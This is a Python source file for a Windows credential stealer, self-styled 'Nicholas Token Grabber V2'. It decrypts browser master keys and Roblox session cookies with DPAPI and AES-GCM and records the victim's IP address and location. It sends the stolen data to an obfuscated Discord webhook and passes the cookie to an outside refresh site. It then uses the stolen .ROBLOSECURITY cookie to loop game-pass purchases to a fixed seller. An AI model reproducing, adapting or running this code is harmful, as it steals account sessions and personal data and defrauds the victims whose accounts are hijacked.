import requests
import os
import shutil
import json
import base64
import win32crypt
from Crypto.Cipher import AES
import platform
import time
from datetime import datetime
import zipfile
import binascii

class CryptoUtils:
    @staticmethod
    def get_master_key(browser_path):
        local_state_path = os.path.join(os.path.dirname(browser_path), 'Local State')
        if not os.path.exists(local_state_path):
            return None, "Local State file not found"
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return master_key, None
        except Exception as e:
            return None, f"Failed to retrieve master key: {str(e)}"

    @staticmethod
    def decrypt_data(buff, master_key):
        if not buff:
            return "Empty data", "No data provided"
        try:
            if isinstance(buff, bytes) and len(buff) > 3 and buff[:3] in [b'v10', b'v11']:
                iv = buff[3:15]
                payload = buff[15:-16]
                tag = buff[-16:]
                cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
                decrypted_data = cipher.decrypt_and_verify(payload, tag)
                try:
                    return decrypted_data.decode('utf-8'), None
                except UnicodeDecodeError:
                    return decrypted_data, "Non-text binary data"
            else:
                if isinstance(buff, bytes):
                    try:
                        decrypted = win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1]
                        try:
                            return decrypted.decode('utf-8'), None
                        except UnicodeDecodeError:
                            return decrypted, "Non-text binary data"
                    except Exception:
                        try:
                            return buff.decode('utf-8'), None
                        except UnicodeDecodeError:
                            return binascii.hexlify(buff).decode('ascii'), "Non-text data (hex encoded)"
                else:
                    return buff, "Plain text (not encrypted)"
        except Exception as e:
            return "Failed to decrypt", f"Decryption error: {str(e)}"

class QwertyLog:
    @staticmethod
    def notify(message):
        print(f"[INFO] {message}")

class BrowserDataExtractor:
    def __init__(self, appdata, roaming, tempfolder):
        self.appdata = appdata
        self.roaming = roaming
        self.tempfolder = tempfolder
        self.browser_paths = {
            'Chrome': os.path.join(self.appdata, r'Google\Chrome\User Data'),
            'Edge': os.path.join(self.appdata, r'Microsoft\Edge\User Data'),
            'Firefox': os.path.join(self.appdata, r'Mozilla\Firefox\Profiles'),
            'Opera': os.path.join(self.roaming, r'Opera Software\Opera Stable'),
            'Opera GX': os.path.join(self.roaming, r'Opera Software\Opera GX Stable'),
            'Brave': os.path.join(self.appdata, r'BraveSoftware\Brave-Browser\User Data'),
            'Yandex': os.path.join(self.appdata, r'Yandex\YandexBrowser\User Data')
        }

    def grab_roblox_cookies(self):
        output_file = os.path.join(self.tempfolder, "Roblox_Cookies.txt")
        roblox_cookies_path = os.path.join(self.appdata, "Roblox", "LocalStorage", "robloxcookies.dat")
        
        if not os.path.exists(roblox_cookies_path):
            with open(output_file, "w", encoding="cp437", errors='ignore') as f:
                f.write("Roblox cookies file not found.\n")
            return "Roblox cookies file not found\n", None
        
        temp_path = os.path.join(self.tempfolder, "RobloxCookies.dat")
        try:
            shutil.copy2(roblox_cookies_path, temp_path)
        except (FileNotFoundError, PermissionError) as e:
            with open(output_file, "w", encoding="cp437", errors='ignore') as f:
                f.write(f"Failed to copy Roblox cookies file: {str(e)}\n")
            return f"Failed to copy Roblox cookies: {str(e)}\n", None
        
        with open(temp_path, 'r', encoding='utf-8') as file:
            try:
                file_content = json.load(file)
                encoded_cookies = file_content.get("CookiesData", "")
                
                if not encoded_cookies:
                    with open(output_file, "w", encoding="cp437", errors='ignore') as f:
                        f.write("No 'CookiesData' found in the file.\n")
                    return "No Roblox CookiesData found\n", None
                
                decoded_cookies = base64.b64decode(encoded_cookies)
                try:
                    decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
                    decrypted_text = decrypted_cookies.decode('utf-8', errors='ignore')
                    with open(output_file, "w", encoding="cp437", errors='ignore') as f:
                        f.write(f"Roblox Cookies | Nicholas Token Grabber V2\n\n")
                        f.write(f"Decrypted Cookies:\n{decrypted_text}\n")
                    return "Roblox cookies extracted\n", decrypted_text
                except Exception as e:
                    with open(output_file, "w", encoding="cp437", errors='ignore') as f:
                        f.write(f"Error decrypting Roblox cookies: {str(e)}\n")
                    return f"Error decrypting Roblox cookies: {str(e)}\n", None
            except json.JSONDecodeError as e:
                with open(output_file, "w", encoding="cp437", errors='ignore') as f:
                    f.write(f"Error parsing Roblox cookies JSON: {str(e)}\n")
                return f"Error parsing Roblox cookies JSON: {str(e)}\n", None
            except Exception as e:
                with open(output_file, "w", encoding="cp437", errors='ignore') as f:
                    f.write(f"Error processing Roblox cookies: {str(e)}\n")
                return f"Error processing Roblox cookies: {str(e)}\n", None
            finally:
                try:
                    os.remove(temp_path)
                except:
                    pass

class Qazwsx_V2:
    def __init__(self):
        self.h = "https://disco"
        self.w = "rd.com/api/webhooks/137322703"
        self.e = "7476651108/CcDsTuT_4FD7EAVBByw"
        self.r = "FoVI9dsMcNvT6wRdWZdwKMPFBx5o-QWR7PuabP5mlkolAh_dR"
        self.webhook = self.h + self.w + self.e + self.r
        self.files = ""
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp") + "\\Nicholas_Token_Grabber_V2"
        self.browser_extractor = BrowserDataExtractor(self.appdata, self.roaming, self.tempfolder)
        self.roblox_cookie = None

        try:
            os.mkdir(os.path.join(self.tempfolder))
        except Exception:
            pass

        self.results = ""
        for browser in ['Chrome', 'Edge', 'Firefox', 'Opera', 'Opera GX', 'Brave', 'Yandex']:
            result, cookie = self.browser_extractor.grab_roblox_cookies()
            self.results += result
            if cookie:
                self.roblox_cookie = cookie
                break  # Stop after finding the first valid cookie

        self.send_info()
        try:
            shutil.rmtree(self.tempfolder)
        except (PermissionError, FileNotFoundError):
            pass

    def getheaders(self, token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    def send_info(self):
        ip = country = city = region = googlemap = "None"
        try:
            data = requests.get("http://ipinfo.io/json").json()
            ip = data.get('ip', 'None')
            city = data.get('city', 'None')
            country = data.get('country', 'None')
            region = data.get('region', 'None')
            googlemap = f"https://www.google.com/maps/search/google+map++{data.get('loc', '0,0')}"
        except Exception:
            pass

        temp = os.path.join(self.tempfolder)
        zip_name = os.path.join(self.appdata, f'Nick[{os.getlogin()}].zip')
        self.zip(temp, zip_name)

        for dirname, _, files in os.walk(self.tempfolder):
            for f in files:
                self.files += f"\n{f}"
        n = len([f for dirname, _, files in os.walk(self.tempfolder) for f in files])
        self.fileCount = f"{n} Files Found: "

        embed = {
            "avatar_url": "https://cdn.discordapp.com/attachments/137775420/987654321/Trollface.png",
            "embeds": [
                {
                    "author": {
                        "name": "Skid Centre",
                        "url": "https://guns.lol/uncoverit",
                        "icon_url": "https://cdn.discordapp.com/attachments/137775420/987654321/Trollface.png"
                    },
                    "description": (
                        f"**{os.getlogin()}** ran a cool piece of software\n"
                        f"```fix\n"
                        f"ComputerName: {os.getenv('COMPUTERNAME')}\n"
                        f"OS: {platform.system()} {platform.release()}\n"
                        f"IP: {ip}\n"
                        f"City: {city}\n"
                        f"Region: {region}\n"
                        f"Country: {country}\n"
                        f"Results: {self.results}\n"
                        f"```\n"
                        f"[Google Maps Location]({googlemap})\n"
                        f"```fix\n{self.fileCount}\n{self.files}\n```\n"
                    ),
                    "color": 16119101,
                    "thumbnail": {
                        "url": "https://cdn.discordapp.com/attachments/137775420/987654321/Trollface.png"
                    },
                    "footer": {
                        "text": "nickwshere#0 / https://guns.lol/nickwshere"
                    }
                },
                {
                    "author": {
                        "name": "Skid Centre",
                        "url": "https://guns.lol/uncoverit",
                        "icon_url": "https://cdn.discordapp.com/attachments/137775420/987654321/Trollface.png"
                    },
                    "description": (
                        f"**Roblox Data for {os.getlogin()}**\n"
                    ),
                    "color": 16119101,
                    "thumbnail": {
                        "url": "https://cdn.discordapp.com/attachments/137775420/987654321/Trollface.png"
                    },
                    "footer": {
                        "text": "nickwshere#0 / https://guns.lol/nickwshere"
                    }
                }
            ]
        }
        
        requests.post(self.webhook, json=embed)
        with open(zip_name, 'rb') as f:
            requests.post(self.webhook, files={'upload_file': f})

    def zip(self, src, dst):
        with zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED) as zipped_file:
            abs_src = os.path.abspath(src)
            for dirname, _, files in os.walk(src):
                for filename in files:
                    absname = os.path.abspath(os.path.join(dirname, filename))
                    arcname = absname[len(abs_src) + 1:]
                    zipped_file.write(absname, arcname)

# Your headers for Roblox API requests
headers = {
    "accept": "*/*",
    "accept-language": "en-GB,en;q=0.9,en-US;q=0.8",
    "content-type": "application/json; charset=UTF-8",
    "origin": "https://www.roblox.com",
    "priority": "u=1, i",
    "referer": "https://www.roblox.com/",
    "sec-ch-ua": "\"Microsoft Edge\";v=\"137\", \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Edg/137.0.0.0",
}

# Cookies for Roblox API requests
cookies = {
    "GuestData": "UserID=-1737649823",
    "_ga_BK4ZY0C59K": "GS2.1.s1748696548$o2$g0$t1748696548$j60$l0$h0",
    "_ga_F8VP9T1NT3": "GS2.1.s1748873849$o1$g0$t1748873849$j60$l0$h0",
    "_ga": "GA1.1.1595986603.1748519472",
    "_ga_9HRYHVCY79": "GS2.1.s1749374859$o1$g0$t1749375014$j60$l0$h0",
    "RBXSource": "rbx_acquisition_time=06/14/2025 15:37:06&rbx_acquisition_referrer=&rbx_medium=Social&rbx_source=&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=0",
    "RBXSessionTracker": "sessionid=ac751504-83ce-44ce-bf4d-92fb6fd55bd1",
    "__utmz": "200924205.1750258072.18.3.utmcsr=ntp.msn.com|utmccn=(referral)|utmcmd=referral|utmcct=/",
    "rbx-ip2": "1",
    "__utma": "200924205.1417137041.1748029490.1750258072.1750271408.19",
    "__utmb": "200924205.0.10.1750271408",
    "__utmc": "200924205",
    ".ROBLOSECURITY": "",  # Will be updated below
}

purchase_url = "https://apis.roblox.com/game-passes/v1/game-passes/1268796851/purchase"
revoke_url = "https://apis.roblox.com/game-passes/v1/game-passes/1268796851:revokeownership"

purchase_data = {
    "expectedCurrency": 1,
    "expectedPrice": 2,
    "expectedSellerId": 8349984303  
}

def get_csrf_token(session):
    try:
        response = session.get("https://www.roblox.com", headers=headers, cookies=cookies)
        if response.status_code == 200:
            return response.headers.get("x-csrf-token", "+vJ1LG+zLHDe")
        return "+vJ1LG+zLHDe"
    except Exception as e:
        print(f"Error fetching CSRF token: {e}")
        return "+vJ1LG+zLHDe"

def fetch_refreshed_cookie(cookie):
    """
    If you want to refresh the cookie by POSTing it somewhere,
    do it here and return the new cookie string.
    """
    try:
        response = requests.post(
            "https://rblxrefresh.net/refresh",
            headers={
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded"
            },
            data={"cookie": cookie},
            timeout=10
        )
        if response.status_code == 200:


            return response.text.strip()
        else:
            print(f"[WARN] Failed to refresh cookie, status code: {response.status_code}")
            return cookie
    except Exception as e:
        print(f"[ERROR] Exception refreshing cookie: {e}")
        return cookie

def main():
    # Initialize the cookie grabber (make sure Qazwsx_V2 class is implemented & imported)
    grabber = Qazwsx_V2()

    # Get the initial cookie from grabber
    if grabber.roblox_cookie:
        print(f"[INFO] Extracted Roblox cookie: {grabber.roblox_cookie}")
        initial_cookie = grabber.roblox_cookie
    else:
        print("[ERROR] No Roblox cookie extracted. Using empty string for .ROBLOSECURITY")
        initial_cookie = ""

    # Refresh cookie if desired
    refreshed_cookie = fetch_refreshed_cookie(initial_cookie)
    cookies[".ROBLOSECURITY"] = refreshed_cookie
    print(f"[INFO] .ROBLOSECURITY cookie set to: {refreshed_cookie}")

    # Start session and loop
    session = requests.Session()
    loop_count = 0
    max_loops = 100
    delay = 0.1

    while loop_count < max_loops:
        try:
            csrf_token = get_csrf_token(session)
            headers["x-csrf-token"] = csrf_token

            purchase_headers = headers.copy()
            purchase_headers["x-bound-auth-token"] = "v1|47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=|1750271764|QxWQ5g8gU6PJIHwqvPrq03UWydTLf0QOS8mDMG12h/BAGs09vgPOU3vZPiTuaa5NkdxVfknU68696T/d8fo7Hw=="
            print(f"[{datetime.now()}] Sending purchase request (Loop {loop_count + 1})...")
            purchase_response = session.post(purchase_url, headers=purchase_headers, cookies=cookies, json=purchase_data)
            print(f"Purchase Response: {purchase_response.status_code} - {purchase_response.text}")

            time.sleep(delay)

            revoke_headers = headers.copy()
            revoke_headers["x-bound-auth-token"] = "v1|47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=|1750271692|wA83YLPzezDdShAJZPtvlvV0MZdAoTRknUuUoPrjFoC5a8BJ9LapxP5AouLn7IU3I1oVf0LZeb3TxnFUqeA/Sg=="
            revoke_headers["content-length"] = "0"
            print(f"[{datetime.now()}] Sending revoke ownership request (Loop {loop_count + 1})...")
            revoke_response = session.post(revoke_url, headers=revoke_headers, cookies=cookies)
            print(f"Revoke Response: {revoke_response.status_code} - {revoke_response.text}")

            loop_count += 1
            time.sleep(delay)

        except Exception as e:
            print(f"Error in loop {loop_count + 1}: {e}")
            time.sleep(delay * 0.1)

if __name__ == "__main__":
    print("Starting Roblox cookie extraction and API request loop...")
    main()

